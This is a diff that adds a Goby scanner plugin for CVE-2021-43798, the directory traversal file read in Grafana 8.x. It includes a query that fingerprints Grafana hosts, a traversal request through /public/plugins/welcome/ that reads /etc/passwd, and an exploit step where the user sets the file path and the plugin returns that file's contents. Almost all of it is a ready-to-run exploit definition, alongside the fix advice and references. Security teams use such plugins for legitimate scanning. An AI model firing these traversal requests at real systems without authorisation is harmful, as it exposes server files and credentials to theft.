@@ -1,0 +1,107 @@
+{
+      "Name": "Grafana v8.x Arbitrary File Read CVE-2021-43798",
+      "Level": "2",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "app=\"grafana_labs-company products\" || product=\"Grafana_Labs-Company Products\" || company=\"Grafana Labs \" || title=\"grafana\"",
+      "Description": "Grafana is an open-source platform for monitoring and observability.",
+      "Product": "Grafana",
+      "Homepage": "https://grafana.com/",
+      "Author": "",
+      "Impact": "Grafana versions 8.0.0-beta1 through 8.3.0 are vulnerable to a local directory traversal, allowing access to local files. The vulnerable URL path is `&lt;grafana_host_url&gt;/public/plugins/NAME/`, where NAME is the plugin ID for any installed plugin.",
+      "Recommendation": "Upgrade to patched versions 8.0.7, 8.1.8, 8.2.7, or 8.3.1.",
+      "References": [
+            "https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p",
+            "https://nosec.org/home/detail/4914.html",
+            "https://github.com/jas502n/Grafana-VulnTips",
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-43798",
+            "https://mp.weixin.qq.com/s/DTkVTtbndaMWL9WGzaI32A"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Path",
+                  "Type": "input",
+                  "Value": "../../../../../../../../../etc/passwd"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/public/plugins/welcome/../../../../../../../../../etc/passwd",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root:x:",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "daemon:x:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/public/plugins/welcome/{{{Path}}}",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
